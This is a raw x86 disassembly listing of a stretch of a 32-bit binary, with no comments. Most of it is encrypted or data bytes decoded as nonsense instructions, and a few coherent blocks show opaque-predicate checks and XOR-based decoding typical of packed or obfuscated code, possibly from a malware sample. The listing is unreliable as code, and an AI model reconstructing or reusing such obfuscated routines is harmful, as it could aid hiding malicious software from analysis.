  408237:	mov    ebx,edi
  408239:	jb     0x4081d5
  40823b:	mov    eax,DWORD PTR [ebp+0x1d3ab00c]
  408241:	pop    ds
  408242:	and    DWORD PTR [esi+0x17],eax
  408245:	rcr    BYTE PTR [edi+0x60],cl
  408248:	adc    bl,BYTE PTR [eax]
  40824a:	add    BYTE PTR [ebp+0x450716d0],ch
  408250:	add    al,0x4d
  408252:	add    ah,bh
  408254:	mov    al,0xb5
  408256:	stc    
  408257:	sub    ecx,DWORD PTR [ecx-0x58]
  40825a:	jmp    0xf0c4:0x197af981
  408261:	pushf  
  408262:	push   edx
  408263:	xchg   edx,eax
  408264:	mov    eax,ds:0x421f813e
  408269:	aad    0x7a
  40826b:	clc    
  40826c:	fiadd  DWORD PTR [ebp+ebx*1-0x6b]
  408270:	fild   DWORD PTR [ebx-0x1d]
  408273:	push   ss
  408274:	push   esp
  408275:	dec    ebx
  408276:	dec    edi
  408277:	cmp    eax,0xf859ad10
  40827c:	daa    
  40827d:	(bad)  
  40827e:	add    BYTE PTR [ecx],bh
  408280:	scas   eax,DWORD PTR es:[edi]
  408281:	mov    eax,0x9a8aa6b8
  408286:	not    dl
  408288:	mov    WORD PTR [edi],?
  40828a:	mov    ecx,0x257759f4
  40828f:	mov    al,0xfd
  408291:	aaa    
  408292:	jmp    ebp
  408294:	sub    bh,BYTE PTR [ebx-0x36]
  408297:	in     al,dx
  408298:	xor    esi,ebx
  40829a:	cmp    al,0x81
  40829c:	and    BYTE PTR [ebx+0xe],dl
  40829f:	das    
  4082a0:	dec    ecx
  4082a1:	jg     0x40826d
  4082a3:	sbb    eax,0x8dfd94fb
  4082a8:	mov    BYTE PTR ds:[edx+0x42],cl
  4082ac:	jb     0x408307
  4082ae:	arpl   WORD PTR [ebp-0x39a56c1c],bx
  4082b4:	add    bh,bh
  4082b6:	push   esp
  4082b7:	adc    BYTE PTR [ecx+0x4750a44f],cl
  4082bd:	xor    bh,BYTE PTR [edx]
  4082bf:	rol    DWORD PTR [esi],1
  4082c1:	sbb    al,0xaa
  4082c3:	mov    ebx,0x342c07d3
  4082c8:	fild   DWORD PTR [eax]
  4082ca:	repnz shl BYTE PTR [edx-0x476ab10d],0xed
  4082d2:	jmp    0x4082ac
  4082d4:	pusha  
  4082d5:	mov    edi,DWORD PTR [edi]
  4082d7:	lods   eax,DWORD PTR ds:[esi]
  4082d8:	sti    
  4082d9:	cmp    BYTE PTR [edx+edx*1],dl
  4082dc:	enter  0x50e4,0xed
  4082e0:	mov    ds:0x7c012c61,eax
  4082e5:	lock cwde 
  4082e7:	cld    
  4082e8:	in     eax,0x39
  4082ea:	das    
  4082eb:	xchg   DWORD PTR [edi+ebp*1-0x193e39cb],eax
  4082f2:	sub    DWORD PTR [edx-0x16],ecx
  4082f5:	or     dl,BYTE PTR [edi]
  4082f7:	mov    eax,ds:0x6bd854ce
  4082fc:	pop    esi
  4082fd:	cs retf 0xc40b
  408301:	sub    al,0xc3
  408303:	adc    al,0xb
  408305:	jbe    0x4082b8
  408307:	push   edi
  408308:	daa    
  408309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40830a:	scas   eax,DWORD PTR es:[edi]
  40830b:	(bad)  
  40830c:	dec    esi
  40830d:	out    dx,al
  40830e:	xchg   edx,eax
  40830f:	scas   al,BYTE PTR es:[edi]
  408310:	js     0x4082f8
  408312:	sbb    eax,0xe025f8c3
  408317:	mov    eax,ds:0x63e73bce
  40831c:	das    
  40831d:	and    al,0x8a
  40831f:	ss ja  0x4082ee
  408322:	mov    ebp,0x873b7451
  408327:	mov    ecx,0xbde617f9
  40832c:	xor    esi,DWORD PTR [edi]
  40832e:	sbb    BYTE PTR [edx],0xa7
  408331:	dec    ebp
  408332:	enter  0xec4,0x45
  408336:	sbb    esi,ebx
  408338:	lahf   
  408339:	stos   BYTE PTR es:[edi],al
  40833a:	push   ds
  40833b:	sub    cl,BYTE PTR [ecx+eiz*1-0x39f99aa9]
  408342:	ins    DWORD PTR es:[edi],dx
  408343:	fwait
  408344:	dec    edi
  408345:	or     DWORD PTR [ecx-0x7b2168cd],ebx
  40834b:	push   0xffffffaa
  40834d:	int3   
  40834e:	add    al,ah
  408350:	sbb    DWORD PTR [esi],ebx
  408352:	xchg   edx,eax
  408353:	sub    DWORD PTR [ebx+0xf38fb78],edx
  408359:	cdq    
  40835a:	mov    esi,0x5488898c
  40835f:	es dec esi
  408361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408362:	fisttp QWORD PTR [ebp+0x563dbfe9]
  408368:	adc    BYTE PTR [esp+edi*8-0x17],bl
  40836c:	mov    bl,BYTE PTR [edi]
  40836e:	shr    DWORD PTR [ebp-0x3b],0x84
  408372:	(bad)  
  408373:	mov    eax,0x42e02ef7
  408378:	dec    esi
  408379:	jl     0x408364
  40837b:	(bad)  
  40837c:	xlat   BYTE PTR ds:[ebx]
  40837d:	fs push 0x2a
  408380:	jp     0x4083aa
  408382:	or     DWORD PTR [esi+eax*1-0x7aaf93d5],ebx
  408389:	lock sbb DWORD PTR [edi-0x3efacbc9],edx
  408390:	sub    eax,0x4da74b1
  408395:	pop    esp
  408396:	and    esp,DWORD PTR [edi-0x7e]
  408399:	in     al,dx
  40839a:	popa   
  40839b:	xchg   ecx,eax
  40839c:	pop    edi
  40839d:	dec    ebp
  40839e:	inc    ecx
  40839f:	fsub   DWORD PTR [edi+edx*2+0x4e]
  4083a3:	(bad)  
  4083a5:	mov    cl,0x90
  4083a7:	pusha  
  4083a8:	or     al,0xe5
  4083aa:	dec    ecx
  4083ab:	rol    edx,1
  4083ad:	dec    ebx
  4083ae:	popa   
  4083af:	push   edi
  4083b0:	outs   dx,BYTE PTR ds:[esi]
  4083b1:	sbb    BYTE PTR [ebx],bl
  4083b3:	push   esi
  4083b4:	out    dx,eax
  4083b5:	in     eax,dx
  4083b6:	xchg   esp,eax
  4083b7:	add    BYTE PTR [ebp-0x16dbc660],al
  4083bd:	dec    edx
  4083be:	loope  0x40838f
  4083c0:	jmp    0x4691de70
  4083c5:	xor    esp,edi
  4083c7:	cmp    DWORD PTR [edi],0xa70bbb8c
  4083cd:	sahf   
  4083ce:	out    0x0,eax
  4083d0:	ret    
  4083d1:	push   eax
  4083d2:	jne    0x40837c
  4083d4:	xchg   esp,eax
  4083d5:	sbb    al,0x74
  4083d7:	repz inc ecx
  4083d9:	(bad)  
  4083da:	fstp   DWORD PTR [ebx-0x57]
  4083dd:	mov    esp,gs
  4083df:	jmp    0x408418
  4083e1:	pushf  
  4083e2:	push   ebp
  4083e3:	stos   BYTE PTR es:[edi],al
  4083e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083e5:	jg     0x40840b
  4083e7:	or     DWORD PTR [edx-0x12c1473b],edi
  4083ed:	lds    ecx,FWORD PTR [eax+0x37]
  4083f0:	sbb    DWORD PTR [ecx+0x7e518ee5],0x15
  4083f7:	pop    esp
  4083f9:	jecxz  0x40839c
  4083fb:	daa    
  4083fc:	lods   al,BYTE PTR ds:[esi]
  4083fd:	fwait
  4083fe:	sub    dl,BYTE PTR [ebx-0x33]
  408401:	ret    0xa149
  408404:	dec    ecx
  408405:	or     ebx,DWORD PTR [edi+0x40]
  408408:	dec    eax
  408409:	adc    ah,BYTE PTR [ecx+0x1f]
  40840c:	add    al,0xa9
  40840e:	push   ds
  40840f:	mov    BYTE PTR [ebp-0x47],ah
  408412:	nop
  408413:	ins    BYTE PTR es:[edi],dx
  408414:	mov    eax,0x1dcf91f7
  408419:	(bad)  
  40841a:	adc    al,0xc5
  40841c:	mov    eax,ds:0x2b838ad0
  408421:	gs add ch,cl
  408424:	(bad)  
  408425:	shl    BYTE PTR [ecx],1
  408427:	fcomp  QWORD PTR [esi+0x39]
  40842a:	(bad)  
  40842b:	adc    esi,DWORD PTR ds:[eax+eiz*8-0x68]
  408430:	xor    eax,0x8b1d0c5d
  408435:	pushf  
  408436:	cmp    eax,0x305cdedd
  40843b:	pop    ebp
  40843c:	push   edx
  40843d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40843e:	popa   
  40843f:	stos   DWORD PTR es:[edi],eax
  408440:	mov    bh,0x83
  408442:	and    bh,BYTE PTR [edx]
  408444:	push   ecx
  408445:	and    al,BYTE PTR [esi]
  408447:	sub    ah,al
  408449:	pop    DWORD PTR [ebx]
  40844b:	outs   dx,BYTE PTR ds:[esi]
  40844c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40844d:	lods   eax,DWORD PTR ds:[esi]
  40844e:	pop    edi
  40844f:	adc    bh,BYTE PTR [edx]
  408451:	adc    DWORD PTR [esi+0x54],eax
  408454:	lahf   
  408455:	arpl   WORD PTR [ecx-0x26],dx
  408458:	xor    dl,BYTE PTR [eax-0x70518796]
  40845e:	jae    0x40849b
  408460:	xchg   esp,eax
  408461:	mov    dh,0xe8
  408463:	cdq    
  408464:	pop    edi
  408465:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408467:	dec    ebx
  408468:	jb     0x4084a9
  40846a:	add    DWORD PTR [ebx+0x38],eax
  40846d:	mov    cl,0xc4
  40846f:	jge    0x40846f
  408471:	dec    ecx
  408472:	mov    ah,0x4b
  408474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408475:	and    ebx,DWORD PTR [ebx+edx*2]
  408478:	jns    0x4084e1
  40847a:	ja     0x40847b
  40847c:	mov    ecx,0xb30bf593
  408481:	jmp    0x4084ee
  408483:	cmp    bh,BYTE PTR [ecx]
  408485:	sbb    al,0x93
  408487:	aaa    
  408488:	mov    dl,0x33
  40848a:	add    DWORD PTR [eax-0x7f],ebx
  40848d:	cmp    ah,ah
  40848f:	sbb    al,0x94
  408491:	out    0xcf,al
  408493:	out    dx,eax
  408494:	xacquire xchg DWORD PTR [ecx+0x78],esi
  408498:	push   cs
  408499:	inc    edx
  40849a:	cmc    
  40849b:	jbe    0x4084ff
  40849d:	cmp    ebp,esi
  40849f:	sbb    eax,DWORD PTR [edi]
  4084a1:	sub    ecx,0xfc1b46fd
  4084a7:	mov    bh,0x76
  4084a9:	test   edi,edi
  4084ab:	inc    edx
  4084ac:	push   ds
  4084ad:	es jge 0x4084f0
  4084b0:	xor    ebp,ebp
  4084b2:	adc    al,0x4e
  4084b4:	xchg   BYTE PTR [ecx-0xf1df974],bh
  4084ba:	mov    eax,DWORD PTR [ebp-0x8]
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	jno    0x4084e7
  408510:	enter  0x321c,0xde
  408514:	jl     0x408592
  408516:	xlat   BYTE PTR ds:[ebx]
  408517:	jns    0x408595
  408519:	jl     0x408501
  40851b:	or     ah,bh
  40851d:	in     al,dx
  40851e:	push   0x9e47578c
  408523:	push   es
  408524:	addr16 aaa 
  408526:	mov    ebx,0x5c0fd3e4
  40852b:	stos   DWORD PTR es:[edi],eax
  40852c:	jmp    0x268b:0xa4e9788e
  408533:	(bad)  
  408534:	push   ss
  408535:	es ins BYTE PTR es:[edi],dx
  408537:	mov    al,ds:0x175f26a3
  40853c:	js     0x40856b
  40853e:	dec    eax
  40853f:	add    edx,DWORD PTR [ebp-0x45]
  408542:	lock lea edx,[ebx+0x36c81dcc]
  408549:	daa    
  40854a:	imul   DWORD PTR [eax+ebx*4]
  40854d:	pop    esp
  40854e:	scas   al,BYTE PTR es:[edi]
  40854f:	out    dx,al
  408550:	and    eax,0xd1ddf719
  408555:	xor    ch,dh
  408557:	xor    BYTE PTR [eax+0x42ac6eb0],cl
  40855d:	and    DWORD PTR [ebx+eax*4],edi
  408560:	dec    esi
  408561:	gs inc edx
  408563:	aad    0x4a
  408565:	xor    dh,BYTE PTR [eax]
  408567:	aas    
  408568:	jmp    0xc8af1c14
  40856d:	xchg   esp,eax
  40856e:	push   edx
  40856f:	xor    eax,0x9b070ff8
  408574:	call   0xcf29:0x510e16f5
  40857b:	cmp    eax,0xdde0ee0e
  408580:	mov    WORD PTR [edx+0x7d],?
  408583:	and    edx,ebp
  408585:	sbb    eax,0xf0de114f
  40858a:	cli    
  40858b:	mov    eax,0xb33b0f9c
  408590:	nop
  408591:	cwde   
  408592:	ret    0x4c1a
  408595:	nop
  408596:	leave  
  408597:	xchg   DWORD PTR [ebx-0x19],eax
  40859a:	mov    ebp,0x33926cb2
  40859f:	sbb    BYTE PTR [ebx+0x55],0xea
  4085a3:	or     bh,BYTE PTR [ebp+0x18]
  4085a6:	add    eax,0xd231b71b
  4085ab:	push   ds
  4085ac:	sbb    al,dl
  4085ae:	pop    ds
  4085af:	lods   eax,DWORD PTR ds:[esi]
  4085b0:	mov    ecx,0xbcf2dec6
  4085b5:	push   ebx
  4085b6:	push   ebp
  4085b7:	pop    ebp
  4085b8:	stos   DWORD PTR es:[edi],eax
  4085b9:	aaa    
  4085ba:	out    dx,al
  4085bb:	mov    ?,WORD PTR [eax]
  4085bd:	mov    ds:0xa91891f1,eax
  4085c2:	in     eax,dx
  4085c3:	call   0x8e72:0xd41ad83f
  4085ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085cb:	or     BYTE PTR [edi+0x6b],dl
  4085ce:	push   eax
  4085cf:	nop
  4085d0:	mov    BYTE PTR [edi],bh
  4085d2:	dec    esp
  4085d3:	mov    al,ds:0x9c02dd3d
  4085d8:	jb     0x40859c
  4085da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085db:	pop    ebp
  4085dc:	shl    bl,1
  4085de:	xchg   edx,eax
  4085df:	pop    edi
  4085e0:	out    dx,eax
  4085e1:	stos   DWORD PTR es:[edi],eax
  4085e2:	push   es
  4085e3:	inc    ebx
  4085e4:	shl    BYTE PTR [edi+0x7d884b2c],1
  4085ea:	pop    esi
  4085eb:	call   0x70ad:0x176eb77b
  4085f2:	xchg   esp,eax
  4085f3:	iret   
  4085f4:	jmp    0x40866f
  4085f6:	pop    ebx
  4085f7:	cld    
  4085f8:	cdq    
  4085f9:	div    DWORD PTR [esi+0xe]
  4085fc:	jb     0x4085b4
  4085fe:	mov    ch,0xcf
  408600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408601:	popa   
  408602:	sbb    al,0xd0
  408604:	xchg   ebx,eax
  408605:	icebp  
  408606:	das    
  408607:	xchg   ecx,eax
  408608:	adc    BYTE PTR [eax],bh
  40860a:	stos   DWORD PTR es:[edi],eax
  40860b:	jae    0x4085fa
  40860d:	and    eax,0x44afab03
  408612:	fwait
  408613:	fs push 0xb6da1b1b
  408619:	(bad)  
  40861a:	in     eax,0x1c
  40861c:	mov    al,0xf3
  40861e:	call   0x215:0xa9b237b4
  408625:	mov    esp,0x3191f7f2
  40862a:	fwait
  40862b:	shl    al,cl
  40862d:	ficom  DWORD PTR [eax+0x49]
  408630:	arpl   WORD PTR [edi-0x38],dx
  408633:	push   ss
  408634:	xchg   DWORD PTR [edi],ebp
  408636:	imul   edx,DWORD PTR [ebp-0x1508b8db],0xffffffe4
  40863d:	pop    esp
  40863e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40863f:	sub    eax,0xbb23ed34
  408644:	es clc 
  408646:	adc    ebx,DWORD PTR [edx+ebx*8]
  408649:	inc    esp
  40864a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40864b:	jmp    0xb4ab:0xd45fa01a
  408652:	adc    esp,ecx
  408654:	cmp    eax,edi
  408656:	inc    esp
  408657:	xchg   ecx,eax
  408658:	pop    ecx
  408659:	cmp    bl,dh
  40865b:	das    
  40865c:	push   ss
  40865d:	rcr    BYTE PTR [edi],0x9e
  408660:	aaa    
  408661:	dec    esp
  408662:	xchg   ebp,eax
  408663:	adc    BYTE PTR [eax+0x6055a500],0xf1
  40866a:	cbw    
  40866c:	pop    eax
  40866d:	sbb    ecx,DWORD PTR [edx+0x45a7876a]
  408673:	push   ebp
  408674:	lds    esp,FWORD PTR [edi-0x3bfb8590]
  40867a:	lock sbb dl,BYTE PTR [edi+0x31308bab]
  408681:	(bad)  
  408682:	arpl   sp,sp
  408684:	and    eax,0x445808eb
  408689:	add    al,0xd0
  40868b:	add    eax,0xfeb87df2
  408690:	lds    ecx,FWORD PTR [eax]
  408692:	clc    
  408693:	into   
  408694:	dec    edx
  408695:	inc    ebp
  408696:	add    edi,ebx
  408698:	push   ecx
  408699:	jmp    0xb362f384
  40869e:	stos   BYTE PTR es:[edi],al
  40869f:	mov    al,0xd1
  4086a1:	inc    edi
  4086a2:	dec    edi
  4086a3:	outs   dx,BYTE PTR ds:[esi]
  4086a4:	ins    BYTE PTR es:[edi],dx
  4086a5:	test   eax,0x5b772e5a
  4086aa:	push   esi
  4086ab:	in     al,dx
  4086ac:	dec    esi
  4086ad:	imul   esp,DWORD PTR ds:0x945a2a97,0x67
  4086b4:	inc    ebp
  4086b5:	pop    esi
  4086b6:	xchg   esi,eax
  4086b7:	and    ah,BYTE PTR [eax]
  4086b9:	fistp  QWORD PTR [esi-0x4f]
  4086bc:	pop    ds
  4086bd:	sbb    ah,BYTE PTR [ebx+0x4b]
  4086c0:	jl     0x40868b
  4086c2:	mov    eax,ds:0xaa4ce
  4086c7:	push   esi
  4086c8:	push   dx
  4086ca:	pop    esi
  4086cb:	(bad)  
  4086cc:	test   al,0x4a
  4086ce:	cli    
  4086cf:	pusha  
  4086d0:	pushf  
  4086d1:	xchg   ebx,eax
  4086d2:	xchg   ebx,eax
  4086d3:	sub    ebp,edx
  4086d5:	iret   
  4086d6:	sbb    al,0xda
  4086d8:	pop    ds
  4086d9:	xchg   ecx,eax
  4086da:	fmul   QWORD PTR [edi-0x27]
  4086dd:	ret    
  4086de:	ret    
  4086df:	mov    WORD PTR [esi],?
  4086e1:	and    al,0x92
  4086e3:	and    ecx,ebp
  4086e5:	xor    BYTE PTR [edi],bh
  4086e7:	inc    esp
  4086e8:	in     al,dx
  4086e9:	rcl    BYTE PTR [edi],0xa6
  4086ec:	jo     0x408695
  4086ee:	xor    al,0xb9
  4086f0:	mov    bh,0x98
  4086f2:	lods   eax,DWORD PTR ds:[esi]
  4086f3:	pop    edx
  4086f4:	inc    ebp
  4086f5:	(bad)  [ebx-0x4ab7642f]
  4086fb:	lods   al,BYTE PTR ds:[esi]
  4086fc:	aad    0xed
  4086fe:	mov    ds,WORD PTR [ebx+0x2ebc0d73]
  408704:	xchg   esi,eax
  408705:	test   BYTE PTR [ecx],cl
  408707:	jp     0x4086c3
  408709:	jg     0x408772
  40870b:	mov    ch,0x43
  40870d:	pusha  
  40870e:	test   eax,0x4658e48f
  408713:	mov    ecx,0xbf09d38b
  408718:	lahf   
  408719:	and    esp,edi
  40871b:	xor    eax,0x42a81cd1
  408720:	scas   al,BYTE PTR es:[edi]
  408721:	(bad)  
  408722:	xor    eax,0xe7d17a16
  408727:	mov    bl,0xfd
  408729:	jno    0x408709
  40872b:	jae    0x4086f5
  40872d:	pop    ebp
  40872e:	or     DWORD PTR [edi+0x54],esp
  408731:	icebp  
  408732:	and    al,0x64
  408734:	mov    ebx,0x1c8b7fda
  408739:	mov    eax,0x9176fac8
  40873e:	mov    ds:0xd0233415,eax
  408743:	loope  0x408764
  408745:	mov    esp,0x645e08df
  40874a:	jne    0x408795
  40874c:	mov    edi,0xeac66689
  408751:	dec    ebp
  408752:	push   esi
  408753:	push   cs
  408754:	jmp    DWORD PTR [edi]
  408756:	xor    DWORD PTR [edx],edx
  408758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408759:	add    al,0xcb
  40875b:	add    esi,DWORD PTR ds:0xf7182eae
  408761:	mov    esi,0x3886ff47
  408766:	mov    eax,0x22ebc3c3
  40876b:	enter  0xc22c,0x1a
  40876f:	and    cl,BYTE PTR [eax+0x191076fe]
  408775:	push   0xfbdd79e6
  40877a:	mov    al,ds:0x1c8b0669
  40877f:	cmp    dh,ah
  408781:	pop    es
  408782:	inc    eax
  408783:	mov    ah,0xa8
  408785:	jmp    0xed0216e1
  40878a:	mov    ah,0xa1
  40878c:	mov    ?,WORD PTR [edi+0x6c]
  40878f:	dec    edi
  408790:	xor    cl,ch
  408792:	adc    BYTE PTR ds:0xcb06ed5,0xbf
  408799:	pop    ebp
  40879a:	dec    esp
  40879b:	or     BYTE PTR [esi+0x27176924],ah
  4087a1:	fcmovnb st,st(5)
  4087a3:	push   ss
  4087a4:	mov    cl,0xa1
  4087a6:	sub    DWORD PTR [ecx],edx
  4087a8:	mov    ch,BYTE PTR [ecx+0x3a]
  4087ab:	loop   0x4087d2
  4087ad:	mov    al,ds:0xdeb45d26
  4087b2:	mov    bh,0x9c
  4087b4:	sbb    BYTE PTR [edi],0xa4
  4087b7:	addr16 retf 
  4087b9:	fwait
  4087ba:	lods   eax,DWORD PTR ds:[esi]
  4087bb:	jmp    0x4087d7
  4087bd:	mov    dl,0x5b
  4087bf:	(bad)  
  4087c0:	aaa    
  4087c1:	fwait
  4087c2:	or     DWORD PTR [eax+0x3f],ebx
  4087c5:	sub    BYTE PTR [ebx-0x61e1d907],al
  4087cb:	or     eax,0x220809b4
  4087d0:	clc    
  4087d1:	aam    0x26
  4087d3:	fxch   st(2)
  4087d5:	ins    BYTE PTR es:[edi],dx
  4087d6:	mov    ebp,0xd2e6e0f5
  4087db:	ret    
  4087dc:	rcr    DWORD PTR [ecx],0x6
  4087df:	mov    WORD PTR [edi-0x5],?
  4087e2:	hlt    
  4087e3:	jge    0x40882e
  4087e5:	cmp    cl,dh
  4087e7:	inc    edx
  4087e8:	mov    ds:0x3648f01,al
  4087ed:	inc    edi
  4087ee:	rcl    DWORD PTR [edx+ebx*4],0xe8
  4087f2:	fs pop edx
  4087f4:	ss js  0x408850
  4087f7:	fmul   st(4),st
  4087f9:	pop    eax
  4087fa:	cwde   
  4087fb:	and    DWORD PTR [ecx],ebx
  4087fd:	fstp   DWORD PTR [edi-0xf35f81a]
  408803:	into   
  408804:	nop
  408805:	mov    ds:0x64d343ca,eax
  40880a:	xchg   edi,eax
  40880b:	mov    DWORD PTR [ecx-0xe],esi
  40880e:	ret    0x96ba
  408811:	pop    esp
  408812:	shr    BYTE PTR [esi+0x6d4f598c],0x26
  408819:	jp     0x4087d6
  40881b:	dec    edx
  40881c:	inc    esi
  40881d:	dec    esi
  40881e:	addr16 mov ds:0x4b00,al
  408822:	test   eax,0x35fdd24
  408827:	jmp    0x408879
  408829:	cs inc esp
  40882b:	dec    ecx
  40882c:	lock loopne 0x408854
  40882f:	outs   dx,DWORD PTR ds:[esi]
  408830:	mov    dh,0xdb
  408832:	jo     0x408851
  408834:	xchg   ecx,eax
  408835:	push   ss
  408836:	jae    0x408867
  408838:	sub    edx,DWORD PTR [edi]
  40883a:	into   
  40883b:	mov    ah,0x30
  40883d:	jmp    0x7e05:0x1b14f639
  408844:	cwde   
  408845:	push   ebp
  408846:	sub    al,0x87
  408848:	retf   0xa718
  40884b:	mov    dh,0xca
  40884d:	jb     0x408807
  40884f:	inc    esi
  408850:	or     eax,0x8796c40a
  408855:	or     esp,edi
  408857:	leave  
  408858:	jmp    0x408885
  40885a:	jbe    0x40889d
  40885c:	loope  0x408867
  40885e:	cli    
  40885f:	scas   al,BYTE PTR es:[edi]
  408860:	mov    ch,0xcb
  408862:	(bad)  
  408863:	cdq    
  408864:	or     BYTE PTR [eax],ah
  408866:	xchg   bl,al
  408868:	(bad)  
  408869:	in     al,0xb5
  40886b:	xchg   edx,eax
  40886c:	cs and ch,al
  40886f:	jmp    DWORD PTR [edx+0x30818538]
  408875:	(bad)  
  408876:	cli    
  408877:	push   eax
  408878:	es jmp 0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0x12
  4088df:	(bad)  
  4088e0:	mul    DWORD PTR [ecx]
  4088e2:	xchg   ebp,eax
  4088e3:	fstp   TBYTE PTR [esp+edi*2-0x29]
  4088e7:	jns    0x408965
  4088e9:	jl     0x408938
  4088eb:	add    BYTE PTR [edx],dh
  4088ed:	push   ss
  4088ee:	push   edi
  4088ef:	inc    ebx
  4088f0:	js     0x40895d
  4088f2:	sbb    BYTE PTR [ebx+0x449f611a],ah
  4088f8:	or     al,BYTE PTR [ebx-0x13]
  4088fb:	cmp    eax,0xab45635d
  408900:	mov    ebx,0xc117c505
  408905:	xor    eax,0xc7eef239
  40890a:	loop   0x4088e6
  40890c:	mov    BYTE PTR [ebx-0x45],0x4f
  408910:	ss out dx,al
  408912:	push   ecx
  408913:	jle    0x408977
  408915:	and    al,0xde
  408917:	adc    BYTE PTR [ebp+0x6b060bdc],dh
  40891d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40891e:	jge    0x408955
  408920:	push   edi
  408921:	es retf 
  408923:	push   cs
  408924:	cmp    BYTE PTR [edx-0x2c],dh
  408927:	in     eax,dx
  408928:	mov    esp,0x730e8c02
  40892d:	in     eax,dx
  40892e:	out    dx,al
  40892f:	imul   edx,ebp,0xbfd7c74e
  408935:	adc    BYTE PTR [edx-0x70],bh
  408938:	lahf   
  408939:	mov    eax,ds:0x98abfb8a
  40893e:	arpl   WORD PTR [esi],di
  408940:	lahf   
  408941:	push   0xc78a6fa7
  408946:	cld    
  408947:	(bad)  
  408948:	ror    DWORD PTR [ecx-0x43],0x23
  40894c:	mov    cl,0xd2
  40894e:	fisttp DWORD PTR [ecx+edx*4]
  408951:	out    0x4b,al
  408953:	and    ch,BYTE PTR [esi+ecx*1-0x2c42102c]
  40895a:	or     al,0x25
  40895c:	xor    eax,0xb910d65d
  408961:	es push ebp
  408963:	rcl    DWORD PTR [edi],1
  408965:	cmp    al,dh
  408967:	jp     0x4088fa
  408969:	fdivr  QWORD PTR [esi-0x227dcfab]
  40896f:	and    bl,BYTE PTR es:[edi+0x77]
  408973:	rcr    DWORD PTR [ecx+0x2419f0b7],cl
  408979:	cli    
  40897a:	ds mov edx,0x6c947110
  408980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408981:	dec    esp
  408982:	scas   eax,DWORD PTR es:[edi]
  408983:	addr16 lahf 
  408985:	retf   
  408986:	popa   
  408987:	inc    esi
  408988:	nop
  408989:	sub    esi,edx
  40898b:	jae    0x408997
  40898d:	nop
  40898e:	pop    edi
  40898f:	(bad)  
  408990:	in     eax,dx
  408991:	aaa    
  408992:	xor    eax,0xd71e2f21
  408997:	jle    0x40899b
  408999:	fcomp  QWORD PTR [eax]
  40899b:	not    DWORD PTR [ecx+0x22c2e15d]
  4089a1:	repz xor al,BYTE PTR [edi]
  4089a4:	daa    
  4089a5:	fidiv  DWORD PTR [esi+0x39]
  4089a8:	mov    ebp,0x5adc6cff
  4089ad:	sub    eax,0x60f3eb45
  4089b2:	outs   dx,DWORD PTR ds:[esi]
  4089b3:	and    BYTE PTR [ebx-0x8],0x92
  4089b7:	out    0x59,eax
  4089b9:	stos   DWORD PTR es:[edi],eax
  4089ba:	out    0x5,eax
  4089bc:	cs cmp eax,0x46bca3a0
  4089c2:	cld    
  4089c3:	(bad)  
  4089c4:	lahf   
  4089c5:	dec    ecx
  4089c6:	mov    edx,0xd2db469c
  4089cb:	push   esp
  4089cc:	adc    eax,0xe37d11fd
  4089d1:	inc    ebp
  4089d2:	xor    al,BYTE PTR [edi-0x1b50667b]
  4089d8:	out    dx,eax
  4089d9:	lods   al,BYTE PTR ds:[esi]
  4089da:	jg     0x408a37
  4089dc:	shl    bl,1
  4089de:	gs leave 
  4089e0:	outs   dx,DWORD PTR ds:[esi]
  4089e1:	sbb    DWORD PTR [edi],edx
